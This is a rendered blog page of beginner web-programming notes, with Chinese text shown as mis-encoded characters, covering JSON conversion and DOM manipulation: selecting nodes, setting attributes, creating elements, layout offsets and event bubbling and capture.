        <h1 id="äºŒã€JSON"   >
          <a href="#äºŒã€JSON" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€JSON" class="headerlink" title="äºŒã€JSON"></a>äºŒã€JSON</h1>
      <p>JSONå³JavaScriptå¯¹è±¡æ•°æ®çš„å­˜å‚¨å½¢å¼ï¼Œä¹Ÿç”¨æ¥å‘é€æ•°æ®</p>

        <h2 id="1-åŸºæœ¬è¯­æ³•"   >
          <a href="#1-åŸºæœ¬è¯­æ³•" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-åŸºæœ¬è¯­æ³•" class="headerlink" title="1.åŸºæœ¬è¯­æ³•"></a>1.åŸºæœ¬è¯­æ³•</h2>
      
        <h3 id="1-è½¬æ¢"   >
          <a href="#1-è½¬æ¢" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-è½¬æ¢" class="headerlink" title="(1)è½¬æ¢"></a>(1)è½¬æ¢</h3>
      
        <h4 id="â‘ å¯¹è±¡è½¬JSONå­—ç¬¦ä¸²"   >
          <a href="#â‘ å¯¹è±¡è½¬JSONå­—ç¬¦ä¸²" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ å¯¹è±¡è½¬JSONå­—ç¬¦ä¸²" class="headerlink" title="â‘ å¯¹è±¡è½¬JSONå­—ç¬¦ä¸²"></a>â‘ å¯¹è±¡è½¬JSONå­—ç¬¦ä¸²</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myJSON = <span class="built_in">JSON</span>.stringify(obj);</span><br><span class="line"><span class="keyword">typeof</span> myJSON = <span class="string">&#x27;string&#x27;</span>;</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¡JSONå­—ç¬¦ä¸²è½¬å¯¹è±¡"   >
          <a href="#â‘¡JSONå­—ç¬¦ä¸²è½¬å¯¹è±¡" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡JSONå­—ç¬¦ä¸²è½¬å¯¹è±¡" class="headerlink" title="â‘¡JSONå­—ç¬¦ä¸²è½¬å¯¹è±¡"></a>â‘¡JSONå­—ç¬¦ä¸²è½¬å¯¹è±¡</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s=<span class="string">&#x27;&#123; &quot;name&quot;:&quot;John&quot;, &quot;age&quot;:30, &quot;city&quot;:&quot;New York&quot;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> myobj=<span class="built_in">JSON</span>.parse(s);</span><br><span class="line"><span class="keyword">typeof</span> myobj==<span class="string">&#x27;object&#x27;</span>;</span><br></pre></td></tr></table></div></figure>




        <h1 id="ä¸‰ã€DOMæ ‘"   >
          <a href="#ä¸‰ã€DOMæ ‘" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸‰ã€DOMæ ‘" class="headerlink" title="ä¸‰ã€DOMæ ‘"></a>ä¸‰ã€DOMæ ‘</h1>
      <p>æ–‡æ¡£å¯¹è±¡æ¨¡å‹</p>
<p>ä»¥æ–‡ä»¶å¤¹æ ‘çš„å½¢å¼è¿›è¡Œå­˜å‚¨ï¼Œä¾æ®æ–‡æ¡£ç”ŸæˆDOMæ ‘</p>
<figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span> My title <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;a.html&quot;</span> &gt;</span> My link <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">h1</span>&gt;</span> My header <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>ä»¥ä¸Šä»£ç å³å¯å½¢æˆä»¥ä¸‹çš„DOMæ ‘</p>
<p><img src="C:/Users/007/AppData/Roaming/Typora/typora-user-images/image-20211125115502855.png" alt="image-20211125115502855"></p>
<p>é€šå¸¸è¿›è¡Œç»“ç‚¹ä¿®æ”¹ä¿¡æ¯</p>

        <h2 id="1-åŸºæœ¬è¯­æ³•-1"   >
          <a href="#1-åŸºæœ¬è¯­æ³•-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-åŸºæœ¬è¯­æ³•-1" class="headerlink" title="1.åŸºæœ¬è¯­æ³•"></a>1.åŸºæœ¬è¯­æ³•</h2>
      
        <h3 id="1-è·å–å±æ€§"   >
          <a href="#1-è·å–å±æ€§" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-è·å–å±æ€§" class="headerlink" title="(1)è·å–å±æ€§"></a>(1)è·å–å±æ€§</h3>
      
        <h4 id="â‘ é€šè¿‡body"   >
          <a href="#â‘ é€šè¿‡body" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ é€šè¿‡body" class="headerlink" title="â‘ é€šè¿‡body"></a>â‘ é€šè¿‡body</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">element = document.body.firstChild.nextSibling.firstChild;</span><br></pre></td></tr></table></div></figure>

<p>æ¯”å¦‚ä»¥ä¸‹ç»“æ„</p>
<figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> Test</span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>Users:<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>John<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>Pete<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  Final</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>å¯»å€divç»“ç‚¹</p>
<figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">divNote = <span class="built_in">document</span>.body.firstChild.nextSibling</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¡é€šè¿‡ID"   >
          <a href="#â‘¡é€šè¿‡ID" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡é€šè¿‡ID" class="headerlink" title="â‘¡é€šè¿‡ID"></a>â‘¡é€šè¿‡ID</h4>
      <figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Sample<span class="tag">&lt;<span class="name">b</span> <span class="attr">id</span>=<span class="string">&quot;mb&quot;</span>&gt;</span>bold<span class="tag">&lt;/<span class="name">b</span>&gt;</span>display<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>ä»¥ä¸Šå½¢å¼çš„bç»“ç‚¹å¯é€šè¿‡å…¶IDæŸ¥æ‰¾</p>
<figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bNote = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;mb&#x27;</span>)</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¢å…¶ä»–æŸ¥æ‰¾å½¢å¼"   >
          <a href="#â‘¢å…¶ä»–æŸ¥æ‰¾å½¢å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¢å…¶ä»–æŸ¥æ‰¾å½¢å¼" class="headerlink" title="â‘¢å…¶ä»–æŸ¥æ‰¾å½¢å¼"></a>â‘¢å…¶ä»–æŸ¥æ‰¾å½¢å¼</h4>
      <p>ä»¥ä¸‹æ–¹æ³•å‡è¿”å›ä¸€ä¸ªæ•°ç»„</p>

        <h5 id="A-tagName"   >
          <a href="#A-tagName" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-tagName" class="headerlink" title="A.tagName"></a>A.tagName</h5>
      <figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello P<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello DOM<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>æŸ¥æ‰¾ï¼š</p>
<figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> tagPArr = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;p&quot;</span>)<span class="comment">//å¾—åˆ°ä¸‰ä¸ªç»“ç‚¹æ ‡ç­¾pçš„æ•°ç»„tagPArr</span></span><br></pre></td></tr></table></div></figure>


        <h5 id="B-className"   >
          <a href="#B-className" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-className" class="headerlink" title="B.className"></a>B.className</h5>
      <figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;example&quot;</span>&gt;</span></span><br><span class="line">    A div element with class=&quot;example&quot;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;example&quot;</span>&gt;</span></span><br><span class="line">    Another div element with class=&quot;example&quot;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;example&quot;</span>&gt;</span>A p element with </span><br><span class="line">    class=&quot;example&quot;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>æŸ¥æ‰¾ï¼š</p>
<figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> classExampleArr = <span class="built_in">document</span>.getElementsByClassName(<span class="string">&quot;example&quot;</span>)</span><br><span class="line"><span class="comment">//å¾—åˆ°ä¸‰ä¸ªç»“ç‚¹classä¸ºexampleçš„æ•°ç»„</span></span><br></pre></td></tr></table></div></figure>


        <h5 id="C-é€‰æ‹©ç¬¦æŸ¥æ‰¾"   >
          <a href="#C-é€‰æ‹©ç¬¦æŸ¥æ‰¾" class="heading-link"><i class="fas fa-link"></i></a><a href="#C-é€‰æ‹©ç¬¦æŸ¥æ‰¾" class="headerlink" title="C.é€‰æ‹©ç¬¦æŸ¥æ‰¾"></a>C.é€‰æ‹©ç¬¦æŸ¥æ‰¾</h5>
      <p>è·å–æ‰€æœ‰æ ‡ç­¾ä¸ºâ€pâ€çš„ç»“ç‚¹ï¼Œè¿”å›å¾—åˆ°ä¸€ä¸ªæ•°ç»„</p>
<figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myNodelist = <span class="built_in">document</span>.querySelectorAll(<span class="string">&quot;p&quot;</span>);</span><br></pre></td></tr></table></div></figure>






        <h3 id="2-è®¾ç½®å±æ€§"   >
          <a href="#2-è®¾ç½®å±æ€§" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-è®¾ç½®å±æ€§" class="headerlink" title="(2)è®¾ç½®å±æ€§"></a>(2)è®¾ç½®å±æ€§</h3>
      
        <h4 id="â‘ å¸¸è§„ä¿®æ”¹"   >
          <a href="#â‘ å¸¸è§„ä¿®æ”¹" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ å¸¸è§„ä¿®æ”¹" class="headerlink" title="â‘ å¸¸è§„ä¿®æ”¹"></a>â‘ å¸¸è§„ä¿®æ”¹</h4>
      <figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> op=<span class="built_in">document</span>.getElementById(<span class="string">&quot;mp&quot;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(op.textContent);<span class="comment">//Samplebolddisplay</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(op.innertHTML);<span class="comment">//Sample&lt;b&gt;bold&lt;/b&gt;display</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(op.outerHTML);</span></span><br><span class="line"><span class="javascript">    <span class="comment">//&lt;p id=&quot;mp&quot;&gt;Sample&lt;b&gt;bold&lt;/b&gt;display&lt;/p&gt;</span></span></span><br><span class="line"><span class="javascript">    op.setAttribute(<span class="string">&quot;class&quot;</span>,<span class="string">&quot;cp&quot;</span>);</span></span><br><span class="line"><span class="javascript">    op.className = <span class="string">&quot;active&quot;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="comment">//cssç»“æ„å±æ€§ä¿®æ”¹</span></span></span><br><span class="line"><span class="javascript">    op.style.<span class="comment">//....</span></span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></div></figure>




        <h3 id="3-æ’å…¥æ–°ç»“ç‚¹"   >
          <a href="#3-æ’å…¥æ–°ç»“ç‚¹" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-æ’å…¥æ–°ç»“ç‚¹" class="headerlink" title="(3)æ’å…¥æ–°ç»“ç‚¹"></a>(3)æ’å…¥æ–°ç»“ç‚¹</h3>
      <figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å…ˆç”Ÿæˆæ ‡ç­¾ä¸ºPçš„ç»“ç‚¹</span></span><br><span class="line">para = <span class="built_in">document</span>.creatElement(<span class="string">&quot;P&quot;</span>);</span><br><span class="line"><span class="comment">//ç”Ÿæˆæ–‡æœ¬å­—ç¬¦ä¸ºMy Textçš„ç»“ç‚¹</span></span><br><span class="line">node = <span class="built_in">document</span>.creatTextNode(<span class="string">&quot;My Text&quot;</span>);</span><br><span class="line"><span class="comment">//å°†æ–‡æœ¬ç»“ç‚¹æ”¾åˆ°paraé‡Œï¼Œå½¢æˆ &lt;p&gt;My Text&lt;/p&gt;  è¿™æ ·çš„ç»“ç‚¹</span></span><br><span class="line">para.appendChild(node);</span><br></pre></td></tr></table></div></figure>




        <h3 id="4-å¸ƒå±€å±æ€§"   >
          <a href="#4-å¸ƒå±€å±æ€§" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-å¸ƒå±€å±æ€§" class="headerlink" title="(4)å¸ƒå±€å±æ€§"></a>(4)å¸ƒå±€å±æ€§</h3>
      <p>å¾—åˆ°å…ƒç´ åœ¨å½“å‰é¡µé¢ä¸­çš„åæ ‡</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211130111349.png" alt="image-20211130111349453"></p>

        <h4 id="â‘ è·å–å¸ƒå±€ä¿¡æ¯"   >
          <a href="#â‘ è·å–å¸ƒå±€ä¿¡æ¯" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ è·å–å¸ƒå±€ä¿¡æ¯" class="headerlink" title="â‘ è·å–å¸ƒå±€ä¿¡æ¯"></a>â‘ è·å–å¸ƒå±€ä¿¡æ¯</h4>
      <p><code>position:</code></p>
<p><code>relative</code>å³ä»£è¡¨è®¾ç½®ä¸ºå¯å®šä½çš„</p>
<p><code>absolute</code>ä»£è¡¨ä»¥æœ€è¿‘è®¾ç½®è¿‡postionçš„å…ƒç´ ä¸ºåŸºå‡†ï¼Œå¾€ä¸Šå±‚æ‰¾å…ƒç´ </p>
<p>ä¸è®¾ç½®postionçŠ¶æ€åˆ™ä¾æ¬¡æ’åˆ—</p>
<figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å…ƒç´ éœ€è¦å…ˆæ˜¯å®šä½è¿‡çš„ï¼Œå³positionå±æ€§è¢«è®¾ç½®</span></span><br><span class="line"><span class="comment">//å¦‚æœæ²¡æœ‰å®šä½ï¼Œåˆ™é»˜è®¤offsetParentä¸ºbodyå…ƒç´ </span></span><br><span class="line"><span class="keyword">var</span> ofH = element.offsetHeight;</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¡è®¾ç½®å¸ƒå±€ä¿¡æ¯"   >
          <a href="#â‘¡è®¾ç½®å¸ƒå±€ä¿¡æ¯" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡è®¾ç½®å¸ƒå±€ä¿¡æ¯" class="headerlink" title="â‘¡è®¾ç½®å¸ƒå±€ä¿¡æ¯"></a>â‘¡è®¾ç½®å¸ƒå±€ä¿¡æ¯</h4>
      <figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">element.style.position = <span class="string">&quot;absolute&quot;</span>;</span><br><span class="line">element.style.left = <span class="string">&quot;40px&quot;</span>;</span><br></pre></td></tr></table></div></figure>




        <h3 id="5-äº‹ä»¶å¤„ç†"   >
          <a href="#5-äº‹ä»¶å¤„ç†" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-äº‹ä»¶å¤„ç†" class="headerlink" title="(5)äº‹ä»¶å¤„ç†"></a>(5)äº‹ä»¶å¤„ç†</h3>
      
        <h4 id="â‘ æ·»åŠ äº‹ä»¶å¤„ç†"   >
          <a href="#â‘ æ·»åŠ äº‹ä»¶å¤„ç†" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ æ·»åŠ äº‹ä»¶å¤„ç†" class="headerlink" title="â‘ æ·»åŠ äº‹ä»¶å¤„ç†"></a>â‘ æ·»åŠ äº‹ä»¶å¤„ç†</h4>
      
        <h5 id="A-ç›´æ¥å®šä¹‰"   >
          <a href="#A-ç›´æ¥å®šä¹‰" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-ç›´æ¥å®šä¹‰" class="headerlink" title="A.ç›´æ¥å®šä¹‰"></a>A.ç›´æ¥å®šä¹‰</h5>
      <figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onclick</span>=<span class="string">&quot;gotMouseClick(&#x27;id42&#x27;);&quot;</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//ç›´æ¥å¤„ç†è¯­å¥ä¸º&quot;this.innerHTML = &#x27;Ooops!&#x27;&quot;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">onclick</span>=<span class="string">&quot;this.innerHTML = &#x27;Ooops!&#x27;&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--HTMLä¸­ç›´æ¥å®šä¹‰å‡½æ•°å¤„ç†--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">onclick</span>=<span class="string">&quot;changeText(this)&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">changeText</span>(<span class="params">id</span>) </span>&#123; </span></span><br><span class="line"><span class="javascript">  id.innerHTML = <span class="string">&quot;Ooops!&quot;</span>;</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></div></figure>


        <h5 id="B-DOMå®šä¹‰"   >
          <a href="#B-DOMå®šä¹‰" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-DOMå®šä¹‰" class="headerlink" title="B.DOMå®šä¹‰"></a>B.DOMå®šä¹‰</h5>
      <figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å–å…ƒç´ ä¹‹åæ·»åŠ å¯¹åº”çš„å¤„ç†äº‹ä»¶</span></span><br><span class="line">element.onclick = mouseClick;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æˆ–è€…</span></span><br><span class="line">element.addEventListener(<span class="string">&quot;click&quot;</span>, mouseClick);</span><br><span class="line">element.removeEventListener.....</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¡è·å–äº‹ä»¶ç›¸å…³ä¿¡æ¯"   >
          <a href="#â‘¡è·å–äº‹ä»¶ç›¸å…³ä¿¡æ¯" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡è·å–äº‹ä»¶ç›¸å…³ä¿¡æ¯" class="headerlink" title="â‘¡è·å–äº‹ä»¶ç›¸å…³ä¿¡æ¯"></a>â‘¡è·å–äº‹ä»¶ç›¸å…³ä¿¡æ¯</h4>
      <figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åœ¨äº‹ä»¶å‡½æ•°ä¸­çš„å¤„ç†,eventå³ä¸ºå½“å‰äº‹ä»¶çš„å¯¹è±¡</span></span><br><span class="line"><span class="built_in">console</span>.log(event.timeStamp);</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¢å¤šäº‹ä»¶å¤„ç†ç›¸åº”é¡ºåº"   >
          <a href="#â‘¢å¤šäº‹ä»¶å¤„ç†ç›¸åº”é¡ºåº" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¢å¤šäº‹ä»¶å¤„ç†ç›¸åº”é¡ºåº" class="headerlink" title="â‘¢å¤šäº‹ä»¶å¤„ç†ç›¸åº”é¡ºåº"></a>â‘¢å¤šäº‹ä»¶å¤„ç†ç›¸åº”é¡ºåº</h4>
      
        <h5 id="A-å†’æ³¡å¤„ç†æ–¹å¼-Bubbling"   >
          <a href="#A-å†’æ³¡å¤„ç†æ–¹å¼-Bubbling" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-å†’æ³¡å¤„ç†æ–¹å¼-Bubbling" class="headerlink" title="A.å†’æ³¡å¤„ç†æ–¹å¼ Bubbling"></a>A.å†’æ³¡å¤„ç†æ–¹å¼ Bubbling</h5>
      <figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;form&#x27;)&quot;</span>&gt;</span>FORM</span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;div&#x27;)&quot;</span>&gt;</span>DIV</span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;p&#x27;)&quot;</span>&gt;</span>P<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>ä»é‡Œå‘å¤–å¤„ç†ï¼Œå³p-&gt;div-&gt;formé¡ºåºå¤„ç†ç›¸åº”äº‹ä»¶</p>

        <h5 id="B-åœæ­¢å†’æ³¡å¤„ç†"   >
          <a href="#B-åœæ­¢å†’æ³¡å¤„ç†" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-åœæ­¢å†’æ³¡å¤„ç†" class="headerlink" title="B.åœæ­¢å†’æ³¡å¤„ç†"></a>B.åœæ­¢å†’æ³¡å¤„ç†</h5>
      <p>åˆ°formå¤„ç†æ—¶åœæ­¢ä¼ æ’­</p>
<figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> </span></span><br><span class="line"><span class="tag"><span class="attr">onclick</span>=<span class="string">&quot;event.stopPropagation()&quot;</span>&gt;</span>FORM</span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;div&#x27;)&quot;</span>&gt;</span>DIV</span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;p&#x27;)&quot;</span>&gt;</span>P<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></div></figure>


        <h5 id="C-ä»å¤–å±‚å‘å†…å¤„ç†-Capture"   >
          <a href="#C-ä»å¤–å±‚å‘å†…å¤„ç†-Capture" class="heading-link"><i class="fas fa-link"></i></a><a href="#C-ä»å¤–å±‚å‘å†…å¤„ç†-Capture" class="headerlink" title="C.ä»å¤–å±‚å‘å†…å¤„ç† Capture"></a>C.ä»å¤–å±‚å‘å†…å¤„ç† Capture</h5>
      <p>æ¯ä¸ªæ ‡ç­¾å‡æ·»åŠ é¼ æ ‡ç‚¹å‡»å¤„ç†äº‹ä»¶ï¼Œalert()å‡½æ•°çš„æ•è·çŠ¶æ€ä¸ºtrueå’Œfalse</p>
<p><code>true</code>:è®¾ç½®æ•è·çŠ¶æ€ä¸ºtrueï¼Œä½¿å…¶å¤„ç†<strong>ä»å¤–å‘å†…</strong>å¤„ç†</p>
<p><code>fasle</code>:è®¾ç½®æ•è·çŠ¶æ€ä¸ºfalseï¼Œä½¿å…¶å¤„ç†<strong>ä»å†…å‘å¤–</strong>å¤„ç†</p>
